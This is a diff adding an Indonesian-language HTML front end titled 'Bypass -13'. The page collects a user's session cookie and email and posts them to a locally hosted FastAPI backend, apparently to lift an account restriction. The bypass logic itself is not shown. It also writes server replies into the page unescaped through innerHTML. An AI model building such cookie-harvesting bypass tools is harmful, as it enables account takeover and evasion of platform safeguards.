@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bypass -13</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* --- Reset & Basic Setup --- */
+        :root {
+            --bg-color: #0f0c29;
+            --card-color: rgba(255, 255, 255, 0.05);
+            --border-color: rgba(255, 255, 255, 0.2);
+            --text-color: #f0f0f0;
+            --primary-glow: #00c6ff;
+            --secondary-glow: #0072ff;
+            --success-color: #28a745;
+            --error-color: #dc3545;
+            --success-glow: rgba(40, 167, 69, 0.5);
+            --error-glow: rgba(220, 53, 69, 0.5);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: var(--bg-color);
+            background: linear-gradient(to right, #24243e, #302b63, #0f0c29);
+            color: var(--text-color);
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* --- Animated Background --- */
+        body::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: 
+                radial-gradient(circle at 20% 20%, var(--primary-glow), transparent 25%),
+                radial-gradient(circle at 80% 70%, var(--secondary-glow), transparent 25%);
+            animation: background-pan 20s linear infinite;
+            z-index: 0;
+            opacity: 0.3;
+        }
+
+        @keyframes background-pan {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* --- Main Container & Card --- */
+        .container {
+            position: relative;
+            z-index: 1;
+            padding: 20px;
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .glass-card {
+            background: var(--card-color);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            animation: fadeIn 1s ease-out, glow 4s infinite alternate;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(30px) scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        @keyframes glow {
+            from {
+                box-shadow: 0 0 10px var(--primary-glow), 0 0 20px var(--primary-glow), 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            }
+            to {
+                box-shadow: 0 0 20px var(--secondary-glow), 0 0 30px var(--secondary-glow), 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            }
+        }
+
+        h1 {
+            font-size: 2rem;
+            font-weight: 600;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+        }
+
+        p {
+            margin-bottom: 30px;
+            font-weight: 300;
+            opacity: 0.8;
+        }
+
+        /* --- Form Elements --- */
+        .input-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            color: var(--text-color);
+            font-size: 1rem;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--primary-glow);
+            box-shadow: 0 0 15px var(--primary-glow);
+        }
+
+        .input-field::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        /* --- Button --- */
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            background: linear-gradient(45deg, var(--primary-glow), var(--secondary-glow));
+            color: white;
+            font-size: 1.2rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.3s;
+            animation: pulse 2s infinite;
+        }
+
+        .submit-btn:hover:not(:disabled) {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px var(--primary-glow);
+        }
+        
+        .submit-btn:active:not(:disabled) {
+            transform: scale(1.02);
+        }
+
+        .submit-btn:disabled {
+            cursor: not-allowed;
+            background: #555;
+            animation: none;
+            opacity: 0.7;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(0, 198, 255, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(0, 198, 255, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(0, 198, 255, 0); }
+        }
+
+        /* --- Response Box --- */
+        .response-box {
+            margin-top: 30px;
+            padding: 15px;
+            border-radius: 10px;
+            font-weight: 400;
+            word-wrap: break-word;
+            min-height: 50px;
+            display: none; /* Hidden by default */
+            opacity: 0;
+            transform: translateY(10px);
+            transition: opacity 0.5s, transform 0.5s;
+        }
+
+        .response-box.show {
+            display: block;
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .response-box.success {
+            background-color: rgba(40, 167, 69, 0.2);
+            border: 1px solid var(--success-color);
+            color: #a7ffc0;
+            box-shadow: 0 0 15px var(--success-glow);
+        }
+
+        .response-box.error {
+            background-color: rgba(220, 53, 69, 0.2);
+            border: 1px solid var(--error-color);
+            color: #ffacac;
+            box-shadow: 0 0 15px var(--error-glow);
+        }
+        
+        .response-box strong {
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        /* --- Responsive Design --- */
+        @media (max-width: 600px) {
+            .glass-card {
+                padding: 30px;
+            }
+            h1 {
+                font-size: 1.8rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="glass-card">
+            <h1>Bypass</h1>
+            <p>Bypass -13</p>
+            
+            <form id="requestForm">
+                <div class="input-group">
+                    <input type="text" id="cookie" class="input-field" placeholder="Cookie" required>
+                </div>
+                <div class="input-group">
+                    <input type="email" id="email" class="input-field" placeholder="Email" required>
+                </div>
+                <button type="submit" id="submitBtn" class="submit-btn">Polosin</button>
+            </form>
+
+            <div id="response" class="response-box"></div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const form = document.getElementById('requestForm');
+            const cookieInput = document.getElementById('cookie');
+            const emailInput = document.getElementById('email');
+            const submitBtn = document.getElementById('submitBtn');
+            const responseBox = document.getElementById('response');
+
+            // GANTI URL INI dengan URL backend FastAPI Anda saat di-deploy
+            // Jika menjalankan di komputer lokal, biasanya http://127.0.0.1:8000
+            const BACKEND_URL = 'http://127.0.0.1:8000/send-request';
+            const COOLDOWN_SECONDS = 30;
+
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+
+                const cookie = cookieInput.value.trim();
+                const email = emailInput.value.trim();
+
+                if (!cookie || !email) {
+                    showResponse('error', 'Gagal', 'Cookie dan Email tidak boleh kosong.');
+                    return;
+                }
+                
+                startCooldown();
+                showResponse('loading', 'Memproses...', 'Sedang mengirim permintaan ke server. Mohon tunggu.');
+
+                try {
+                    const response = await fetch(BACKEND_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ cookie, email }),
+                    });
+
+                    const result = await response.json();
+
+                    if (response.ok) {
+                        // Status 200 OK
+                        showResponse('success', 'Sukses!', result.message);
+                    } else {
+                        // Status 4xx atau 5xx
+                        showResponse('error', 'Gagal!', result.message || 'Terjadi kesalahan yang tidak diketahui.');
+                    }
+
+                } catch (error) {
+                    console.error('Fetch Error:', error);
+                    showResponse('error', 'Error Jaringan', 'Tidak dapat terhubung ke server. Pastikan backend berjalan dan URL sudah benar.');
+                }
+            });
+
+            function startCooldown() {
+                submitBtn.disabled = true;
+                let countdown = COOLDOWN_SECONDS;
+                submitBtn.textContent = `Tunggu (${countdown}s)`;
+
+                const interval = setInterval(() => {
+                    countdown--;
+                    submitBtn.textContent = `Tunggu (${countdown}s)`;
+                    if (countdown <= 0) {
+                        clearInterval(interval);
+                        submitBtn.disabled = false;
+                        submitBtn.textContent = 'Polosin';
+                    }
+                }, 1000);
+            }
+
+            function showResponse(type, title, message) {
+                responseBox.classList.remove('success', 'error', 'loading');
+                
+                if (type === 'success') {
+                    responseBox.classList.add('success');
+                } else if (type === 'error') {
+                    responseBox.classList.add('error');
+                } else {
+                     responseBox.classList.add('loading'); // Style 'loading' can be the same as 'success' or unique
+                }
+                
+                responseBox.innerHTML = `<strong>${title}</strong>${message}`;
+                responseBox.classList.add('show');
+            }
+        });
+    </script>
+
+</body>
+</html>
